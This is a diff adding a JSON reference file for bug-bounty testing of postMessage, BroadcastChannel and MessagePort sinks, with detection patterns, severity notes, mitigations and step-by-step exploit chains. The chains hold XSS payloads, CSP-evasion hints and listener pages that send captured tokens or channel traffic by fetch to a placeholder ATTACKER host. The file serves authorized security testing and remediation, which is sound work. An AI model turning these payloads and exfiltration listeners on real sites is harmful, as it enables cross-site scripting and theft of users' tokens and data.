@@ -1,0 +1,361 @@
+{
+  "category": "postmessage",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-message-event-handler",
+      "name": "message event handler",
+      "category": "postmessage",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "addEventListener(\"message\"",
+        "addEventListener('message'",
+        "window.onmessage",
+        "onmessage",
+        "message event"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 when e.data reaches an execution/DOM sink without an origin check; P4 when the handler only performs benign logic on the data.",
+      "explain": "A window 'message' event listener (window.addEventListener('message', handler) or window.onmessage) receives cross-origin postMessage traffic. Any window — an iframe, an opener, a popup — from ANY origin can deliver data to it. If the handler does not verify event.origin and feeds event.data into a DOM-write or execution sink, any website the victim visits can trigger XSS in the target origin.",
+      "how_it_works": "postMessage is designed for cross-origin communication, so the browser deliberately delivers messages from any origin; authentication is the developer's job via event.origin and event.source checks. When those checks are missing (or implemented with a weak regex / endsWith that an attacker subdomain satisfies), e.data is fully attacker-controlled. e.data -> innerHTML/eval/location.href turns a missing origin check into DOM XSS or open redirect on the victim's trusted origin.",
+      "why_it_matters": "Unlike reflected XSS, no server interaction is needed: the attacker page itself delivers the payload while the victim is authenticated on the target. This bypasses every server-side WAF and is one of the most consistently accepted client-side bug classes on bug bounty platforms.",
+      "exploitable_when": [
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Confirm the handler lacks a strict origin check and that e.data reaches a sink",
+              "payload": "addEventListener(\"message\"",
+              "command": "grep -n 'addEventListener(\"message\"\\|onmessage' app.js -A6 | grep -n 'origin\\|e.data'",
+              "indicator": "the handler reads e.data (or event.data) into innerHTML/eval/location.href with no comparison of e.origin against a fixed trusted origin"
+            },
+            {
+              "action": "Build a PoC page on the attacker origin that embeds the target and posts the payload",
+              "payload": "<iframe id=f src=\"https://TARGET/page\"></iframe><script>f.onload=()=>f.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')</script>",
+              "command": "host the PoC at https://ATTACKER/poc.html and open it in a browser",
+              "indicator": "the iframe loads https://TARGET/page and the DevTools console shows no error delivering the message"
+            },
+            {
+              "action": "Observe code execution in the target origin",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://ATTACKER/poc.html' in a browser",
+              "indicator": "alert(document.domain) fires showing TARGET's domain — the payload executed inside the target origin"
+            }
+          ],
+          "eligibility": "postMessage DOM XSS with a missing/weak origin check is accepted on all major platforms (HackerOne, Bugcrowd, Intigriti); severity scales with the sink it reaches (XSS > redirect > data leak)."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Identify a weak origin check that can be bypassed",
+              "payload": "e.origin.endsWith('target.com')",
+              "command": "grep -n 'origin' app.js | grep -n 'endsWith\\|indexOf\\|match\\|includes'",
+              "indicator": "the check uses endsWith/includes/indexOf instead of strict equality, so https://target.com.ATTACKER satisfies it"
+            },
+            {
+              "action": "Register the bypass domain variant and host the same PoC there",
+              "payload": "https://target.com.ATTACKER/poc.html",
+              "command": "open 'https://target.com.ATTACKER/poc.html' in a browser",
+              "indicator": "the origin check passes and the injected payload still detonates in the target origin"
+            }
+          ],
+          "eligibility": "Weak-origin-check bypass is treated the same as a missing check by platforms; document the exact bypass origin in the report."
+        }
+      ],
+      "contexts": {
+        "html-body": "e.data written to innerHTML/document.write: inject a full HTML payload such as <img src=x onerror=alert(document.domain)>.",
+        "attr": "e.data written into an attribute (e.g. iframe.src or a.href): use a javascript: URL or break out with \"> to create a new tag.",
+        "js-string": "e.data concatenated into a JS string passed to eval/setTimeout: break out with ';alert(document.domain)// to start a new statement.",
+        "url": "e.data assigned to location.href: send javascript:alert(document.domain) if no scheme allowlist exists."
+      },
+      "waf_notes": "No server ever sees the attack — the payload travels browser-to-browser — so server-side WAFs are completely blind. Client-side CSP can still block the final sink (e.g. script-src blocking inline event handlers); use a payload that fits the CSP (existing allowed script gadgets, DOM clobbering) if CSP is present.",
+      "eligibility": "One of the strongest client-side findings: missing origin check + e.data to a dangerous sink = accepted XSS on essentially all platforms. If the data only reaches a benign sink, report as informational (missing defense-in-depth) unless you can chain it further.",
+      "mitigations": [
+        "Always compare event.origin with strict equality against an explicit allowlist: if (e.origin !== 'https://trusted.example') return;",
+        "Validate event.source against the expected window reference when possible",
+        "Treat e.data as untrusted: schema-validate it and never pass it to innerHTML, eval, or location without sanitization",
+        "Senders must use an explicit targetOrigin instead of '*' for any non-public data"
+      ],
+      "related": [
+        "postMessage send with '*' targetOrigin",
+        "BroadcastChannel",
+        "MessagePort / MessageChannel",
+        "innerHTML",
+        "eval"
+      ],
+      "references": [
+        "PortSwigger: DOM-based vulnerabilities using web messaging",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting",
+        "MDN: Window.postMessage security concerns"
+      ]
+    },
+    {
+      "id": "sink-postmessage-send-star",
+      "name": "postMessage send with '*' targetOrigin",
+      "category": "postmessage",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "postMessage",
+        "window.postMessage",
+        "contentWindow.postMessage",
+        "postMessage("
+      ],
+      "severity": "P3",
+      "severity_note": "P3 when tokens/session data/PII are sent with '*'; P5 when only non-sensitive UI state is broadcast.",
+      "explain": "window.postMessage(message, '*') delivers the message to whatever origin currently occupies the target frame/window. The '*' targetOrigin disables the browser's origin check on the SEND side: if an attacker can swap, navigate, or embed the receiving window, they receive the data.",
+      "how_it_works": "postMessage's second argument is the confidentiality boundary. With '*', the browser hands the serialized message to any origin. Classic leaks: a page posts an auth token or user object to a child iframe with '*' — an attacker who can replace that iframe (open redirect, compromised third-party frame, or simply opening the page via window.open and racing navigation) registers a 'message' listener and harvests the data.",
+      "why_it_matters": "This is the mirror image of the missing origin check: instead of code execution, you get cross-origin data disclosure — OAuth tokens, session identifiers, PII — sent straight to an attacker-controlled origin.",
+      "exploitable_when": [
+        "postMessage-data",
+        "window.opener"
+      ],
+      "chains": [
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Confirm sensitive data is posted with a wildcard targetOrigin",
+              "payload": "postMessage(",
+              "command": "grep -n 'postMessage' app.js | grep -nF \"'*'\"",
+              "indicator": "a postMessage call whose second argument is '*' and whose first argument contains tokens, user data, or URLs with credentials"
+            },
+            {
+              "action": "Stand up a listener page that embeds or opens the target and captures the message",
+              "payload": "<script>onmessage=e=>{fetch('https://ATTACKER/log?d='+encodeURIComponent(JSON.stringify(e.data)))};open('https://TARGET/page')</script>",
+              "command": "host at https://ATTACKER/sniff.html and open it in a browser",
+              "indicator": "https://ATTACKER/log receives a request whose d parameter contains the posted token or user data"
+            }
+          ],
+          "eligibility": "Accepted when real sensitive data (tokens, PII, credentials) is demonstrably exfiltrated to the attacker origin; downgraded or closed as informational if the data is non-sensitive."
+        },
+        {
+          "source": "window.opener",
+          "steps": [
+            {
+              "action": "Host an attacker listener page that opens the target",
+              "payload": "w = window.open('https://TARGET/page'); window.addEventListener('message', e => fetch('https://ATTACKER/c?d='+encodeURIComponent(e.data)))",
+              "command": "serve poc.html on https://ATTACKER and lure the victim to open it",
+              "indicator": "the victim's target page fires its postMessage('*') and the token/data arrives at your listener"
+            },
+            {
+              "action": "Verify the leaked data is actually sensitive",
+              "payload": "e.data",
+              "command": "inspect the captured message on your server logs",
+              "indicator": "the payload contains tokens, PII, or internal state — not public data"
+            }
+          ],
+          "eligibility": "Accepted when the leaked data is demonstrably sensitive (tokens/PII). If the message only contains public data, most programs downgrade to Informational."
+        }
+      ],
+      "contexts": {
+        "html-body": "Not applicable — this sink leaks data rather than rendering it; demonstrate impact via the exfiltration listener.",
+        "attr": "If the posted message contains a URL with tokens in the query string, show the full URL arriving at the attacker listener.",
+        "js-string": "Not applicable — impact is data disclosure, not code execution."
+      },
+      "waf_notes": "Fully browser-side; no server log shows the leak. The only mitigation signal visible to defenders is the literal '*' in the source or DevTools message logging.",
+      "eligibility": "Platforms accept this as sensitive-data exposure when you show a concrete token/PII capture. Sending public or non-sensitive data with '*' is routinely closed as informational — verify what is actually in the message before reporting.",
+      "mitigations": [
+        "Always pass an explicit targetOrigin: w.postMessage(data, 'https://trusted.example')",
+        "Never include credentials or PII in postMessage payloads; use opaque message ids and fetch the data server-side instead",
+        "On the receiver, verify event.origin with strict equality"
+      ],
+      "related": [
+        "message event handler",
+        "BroadcastChannel",
+        "MessagePort / MessageChannel"
+      ],
+      "references": [
+        "PortSwigger: DOM-based vulnerabilities using web messaging",
+        "MDN: Window.postMessage",
+        "HackTricks: PostMessage Vulnerabilities"
+      ]
+    },
+    {
+      "id": "sink-broadcastchannel",
+      "name": "BroadcastChannel",
+      "category": "postmessage",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "BroadcastChannel",
+        "new BroadcastChannel",
+        "broadcastchannel"
+      ],
+      "severity": "P4",
+      "severity_note": "P3 when a BroadcastChannel message flows into an execution/DOM sink (second-order XSS across tabs); P4 for send-side sensitive data broadcast.",
+      "explain": "BroadcastChannel provides pub/sub messaging between all same-origin browsing contexts (tabs, iframes, workers) on a named channel. bc.onmessage receives whatever any same-origin context posts — with no origin field at all — and bc.postMessage broadcasts to every listener on the channel.",
+      "how_it_works": "Because BroadcastChannel is same-origin only, the threat model differs from postMessage: the attacker needs a foothold in the same origin (an XSS anywhere on the origin, or a second tab in self-XSS scenarios). Once any same-origin context is attacker-influenced, bc.onmessage handlers that trust messages become second-order sinks: the attacker tab posts a payload, the victim tab's handler writes it to innerHTML.",
+      "why_it_matters": "It converts a low-impact same-origin foothold into cross-tab stored XSS, and it leaks data: anything broadcast (tokens, state) is readable by every same-origin tab, including any tab running injected code.",
+      "exploitable_when": [
+        "broadcastchannel-message"
+      ],
+      "chains": [
+        {
+          "source": "broadcastchannel-message",
+          "steps": [
+            {
+              "action": "Find the channel name and confirm onmessage data reaches a sink",
+              "payload": "new BroadcastChannel(",
+              "command": "grep -n 'BroadcastChannel\\|onmessage' app.js",
+              "indicator": "a handler like bc.onmessage = e => el.innerHTML = e.data with no validation of e.data"
+            },
+            {
+              "action": "Post a payload on the same channel from any same-origin context",
+              "payload": "new BroadcastChannel('app-channel').postMessage('<img src=x onerror=alert(document.domain)>')",
+              "command": "open 'https://TARGET/page' in one tab, then run the payload line in the DevTools console of a second tab on https://TARGET",
+              "indicator": "alert(document.domain) fires in the first tab when its onmessage handler processes the broadcast"
+            },
+            {
+              "action": "Upgrade from self-XSS to a real chain by finding a same-origin injection point that can post to the channel",
+              "payload": "<img src=x onerror=\"new BroadcastChannel('app-channel').postMessage('<svg onload=alert(document.domain)>')\">",
+              "command": "inject the payload through any existing same-origin HTML injection on https://TARGET",
+              "indicator": "every other open tab on the origin executes the second-stage payload via the BroadcastChannel handler"
+            }
+          ],
+          "eligibility": "Console-only detonation is self-XSS and usually NOT eligible alone; it becomes a valid finding when paired with any same-origin injection primitive, or when sensitive data is broadcast to contexts an attacker can script."
+        },
+        {
+          "source": "broadcastchannel-message",
+          "steps": [
+            {
+              "action": "Gain a same-origin foothold to speak on the channel",
+              "payload": "bc = new BroadcastChannel('auth-channel'); bc.postMessage('<img src=x onerror=alert(1)>')",
+              "command": "from ANY page on the same origin (e.g. a subdomain XSS or your own tab), run the snippet in DevTools (replace 'auth-channel' with the channel name found in code)",
+              "indicator": "the victim tab's onmessage handler fires with your crafted data"
+            },
+            {
+              "action": "Deliver the sink-appropriate payload",
+              "payload": "<img src=x onerror=alert(1)>  (shape the payload for the downstream sink)",
+              "command": "post it via the snippet from step 1",
+              "indicator": "the handler passes your message into its sink and it executes"
+            }
+          ],
+          "eligibility": "Requires a same-origin injection point first — report it as a chained amplifier, not a standalone bug. Programs accept it when the end impact (XSS, state change) is shown."
+        }
+      ],
+      "contexts": {
+        "html-body": "e.data to innerHTML: standard HTML payload such as <img src=x onerror=alert(document.domain)>.",
+        "attr": "e.data placed in an attribute: javascript: URLs or attribute breakout.",
+        "js-string": "e.data into an eval-like sink: string breakout such as ';alert(document.domain)//."
+      },
+      "waf_notes": "No network traffic crosses the server — messages stay inside the browser. WAFs see nothing; CSP governs only the final sink.",
+      "eligibility": "Treat honestly: a BroadcastChannel sink without a separate injection primitive is self-XSS (informational). With a primitive or with sensitive data broadcast, it is a legitimate P3 chain.",
+      "mitigations": [
+        "Validate and sanitize e.data in onmessage handlers exactly like postMessage data",
+        "Use structured message envelopes with a type field and reject unknown types",
+        "Never broadcast tokens or PII; any same-origin tab can read the channel"
+      ],
+      "related": [
+        "message event handler",
+        "MessagePort / MessageChannel",
+        "localStorage",
+        "innerHTML"
+      ],
+      "references": [
+        "MDN: BroadcastChannel",
+        "PortSwigger: DOM-based vulnerabilities using web messaging",
+        "HackTricks: PostMessage Vulnerabilities"
+      ]
+    },
+    {
+      "id": "sink-messageport",
+      "name": "MessagePort / MessageChannel",
+      "category": "postmessage",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "MessageChannel",
+        "new MessageChannel",
+        "port.postMessage",
+        "port1",
+        "port2",
+        "messageport"
+      ],
+      "severity": "P4",
+      "severity_note": "P3 when port.onmessage feeds a DOM/execution sink or when a port is transferred across origins with '*' exposing a privileged messaging channel.",
+      "explain": "MessageChannel creates a pair of entangled MessagePorts (channel.port1/port2). One port is often transferred to another window or worker via postMessage(msg, origin, [port]); afterwards both ends talk through port.postMessage and port.onmessage. Handlers on ports frequently skip validation because the channel feels private.",
+      "how_it_works": "The privacy of a MessageChannel depends entirely on who receives the transferred port. If the port is posted with targetOrigin '*', any origin occupying that window grabs the port and can both read privileged messages and inject messages into the channel. On the receive side, port.onmessage data is commonly written straight into the DOM because developers assume only trusted code holds the other end.",
+      "why_it_matters": "MessagePort channels often carry higher-privilege traffic than plain postMessage (RPC calls, credentials, worker commands). A leaked port means full bidirectional impersonation of a trusted endpoint.",
+      "exploitable_when": [
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Locate where a port is transferred and check the targetOrigin",
+              "payload": "new MessageChannel(",
+              "command": "grep -n 'MessageChannel\\|postMessage' app.js | grep -nF '*'",
+              "indicator": "a call like w.postMessage(msg, '*', [channel.port2]) transferring a port with a wildcard origin"
+            },
+            {
+              "action": "Capture the transferred port from an attacker page occupying that window",
+              "payload": "<script>onmessage=e=>{if(e.ports.length){e.ports[0].onmessage=m=>fetch('https://ATTACKER/log?d='+JSON.stringify(m.data))}};open('https://TARGET/page')</script>",
+              "command": "host at https://ATTACKER/port.html and open it in a browser",
+              "indicator": "https://ATTACKER/log receives the privileged channel traffic, proving the port was captured"
+            },
+            {
+              "action": "Inject a message through the captured port into a trusting handler",
+              "payload": "port.postMessage('<img src=x onerror=alert(document.domain)>')",
+              "command": "extend https://ATTACKER/port.html to post the payload through the captured port",
+              "indicator": "alert(document.domain) fires in the target page whose port.onmessage writes e.data into the DOM"
+            }
+          ],
+          "eligibility": "Port capture via '*' transfer is an accepted finding when privileged data flows over the channel; a purely same-window MessageChannel with no cross-origin transfer is internal plumbing and not a finding by itself."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Check if a port leaks to an attacker window via wildcard transfer",
+              "payload": "w = window.open('https://TARGET/page'); w.addEventListener?.('message', e => console.log(e.data, e.ports))",
+              "command": "open poc.html on https://ATTACKER that opens the target and watches message events",
+              "indicator": "e.ports contains a MessagePort — the target transferred a port with targetOrigin '*'"
+            },
+            {
+              "action": "Speak to the victim's port handler directly",
+              "payload": "e.ports[0].postMessage('<img src=x onerror=alert(1)>')",
+              "command": "send a payload shaped for the victim's port.onmessage handler (match the downstream sink)",
+              "indicator": "the victim page processes your message as if it came from its trusted partner"
+            }
+          ],
+          "eligibility": "Wildcard port transfers are uncommon but treated as valid High-impact issues when you can show two-way control of the victim's trusted channel."
+        }
+      ],
+      "contexts": {
+        "html-body": "port.onmessage data to innerHTML: <img src=x onerror=alert(document.domain)>.",
+        "attr": "port data into an attribute sink: javascript: URL or breakout.",
+        "js-string": "port data into eval/Function: ';alert(document.domain)//."
+      },
+      "waf_notes": "Entirely browser-internal after the transfer; WAFs are blind. Inspect transferred ports during manual review via DevTools message logging on both endpoints.",
+      "eligibility": "Valid when the channel crosses a trust boundary (different origin, different privilege level, worker with elevated APIs). Same-context port plumbing without a boundary is informational.",
+      "mitigations": [
+        "Transfer ports only with an explicit targetOrigin, never '*'",
+        "Validate message shape on port.onmessage exactly like window message handlers",
+        "Do not expose privileged operations over a port without authenticating the peer"
+      ],
+      "related": [
+        "message event handler",
+        "postMessage send with '*' targetOrigin",
+        "BroadcastChannel",
+        "dynamic Worker code"
+      ],
+      "references": [
+        "MDN: MessageChannel",
+        "PortSwigger: DOM-based vulnerabilities using web messaging",
+        "HackTricks: PostMessage Vulnerabilities"
+      ]
+    }
+  ]
+}
